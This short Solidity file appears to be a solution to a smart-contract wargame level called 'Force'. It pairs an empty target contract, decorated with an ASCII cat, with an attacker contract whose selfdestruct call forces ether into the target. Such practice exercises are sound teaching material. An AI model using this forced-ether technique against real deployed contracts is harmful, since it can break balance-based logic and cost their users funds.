// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract forceAttack {
    address target;

    constructor(address _target) payable {
        target = _target;
    }

    function attack() public {
        selfdestruct(payable(target));
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }
}
